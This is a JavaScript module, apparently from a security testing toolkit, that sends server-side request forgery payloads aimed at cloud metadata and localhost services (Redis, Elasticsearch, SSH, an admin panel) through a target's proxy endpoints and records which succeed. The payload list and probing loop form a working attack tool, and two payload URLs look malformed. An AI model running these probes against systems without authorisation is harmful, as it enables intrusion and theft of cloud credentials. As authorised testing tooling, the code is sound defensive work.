const { httpGet, httpPost } = require('../lib/http-client');
const { EvidenceManager } = require('../lib/evidence-manager');

class SSRFTester {
  constructor(domain, evidenceDir) {
    this.domain = domain;
    this.evidence = new EvidenceManager(evidenceDir);
    this.results = {
      timestamp: new Date().toISOString(),
      domain,
      tests: [],
      vulnerabilities: []
    };
  }

  getSSRFPayloads() {
    return [
      { type: 'aws-metadata', url: 'http://169.254.169.254/latest/meta-data/', severity: 'critical' },
      { type: 'aws-metadata-v2', url: 'http://169.254.169.254/latest/meta_data/', severity: 'critical' },
      { type: 'localhost-ssh', url: 'http://localhost:22/', severity: 'high' },
      { type: 'localhost-redis', url: 'http://127.0.0.1:6379/', severity: 'critical' },
      { type: 'localhost-elasticsearch', url: 'http://127.0.0.1:9200/', severity: 'high' },
      { type: 'localhost-admin', url: 'http://localhost:8080/admin', severity: 'high' },
      { type: 'dns-rebinding', url: 'http://169.254.169.254.latest.meta_data/', severity: 'medium' }
    ];
  }

  async testProxyEndpoint(proxyPath, urlParam = 'url') {
    console.log(`\nTesting SSRF on proxy endpoint: ${proxyPath}`);
    
    const payloads = this.getSSRFPayloads();
    const results = [];

    for (const payload of payloads) {
      const testUrl = `${proxyPath}?${urlParam}=${encodeURIComponent(payload.url)}`;
      
      const response = await httpGet(this.domain, testUrl);
      
      const result = {
        payload: payload.type,
        targetUrl: payload.url,
        status: response.status,
        bodyLength: response.bodyLength,
        success: this.isSSRFSuccess(response, payload),
        response
      };

      results.push(result);

      if (result.success) {
        const vuln = {
          type: 'ssrf',
          severity: payload.severity,
          payload: payload.type,
          targetUrl: payload.url,
          endpoint: proxyPath,
          evidence: JSON.stringify({
            request: testUrl,
            response: {
              status: response.status,
              body: response.body.substring(0, 500)
            }
          }, null, 2)
        };

        this.results.vulnerabilities.push(vuln);
        
        this.evidence.saveEvidence(
          'ssrf',
          this.domain,
          proxyPath,
          vuln
        );
      }

      await this.delay(200);
    }

    this.results.tests.push({
      endpoint: proxyPath,
      totalPayloads: payloads.length,
      successful: results.filter(r => r.success).length,
      results
    });

    return results;
  }

  async testPostProxyEndpoint(proxyPath, urlParam = 'url') {
    console.log(`\nTesting SSRF on POST proxy endpoint: ${proxyPath}`);
    
    const payloads = this.getSSRFPayloads();
    const results = [];

    for (const payload of payloads) {
      const response = await httpPost(this.domain, proxyPath, {
        [urlParam]: payload.url
      });

      const result = {
        payload: payload.type,
        targetUrl: payload.url,
        status: response.status,
        bodyLength: response.bodyLength,
        success: this.isSSRFSuccess(response, payload),
        response
      };

      results.push(result);

      if (result.success) {
        const vuln = {
          type: 'ssrf-post',
          severity: payload.severity,
          payload: payload.type,
          targetUrl: payload.url,
          endpoint: proxyPath,
          evidence: JSON.stringify({
            request: { [urlParam]: payload.url },
            response: {
              status: response.status,
              body: response.body.substring(0, 500)
            }
          }, null, 2)
        };

        this.results.vulnerabilities.push(vuln);
      }

      await this.delay(200);
    }

    return results;
  }

  isSSRFSuccess(response, payload) {
    if (response.error || response.status >= 400) return false;

    const body = response.body.toLowerCase();
    
    if (payload.type.includes('aws-metadata')) {
      return body.includes('ami-id') || body.includes('instance-id') || 
             body.includes('local-ipv4') || body.includes('public-ipv4');
    }
    
    if (payload.type.includes('localhost-redis')) {
      return body.includes('redis') || body.includes('info server');
    }
    
    if (payload.type.includes('localhost-elasticsearch')) {
      return body.includes('elasticsearch') || body.includes('cluster_name');
    }

    return response.bodyLength > 0 && response.status === 200;
  }

  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  getResults() {
    return this.results;
  }

  saveResults() {
    return this.evidence.saveJson(
      `ssrf-test-${this.domain}-${Date.now()}.json`,
      this.results
    );
  }
}

module.exports = { SSRFTester };
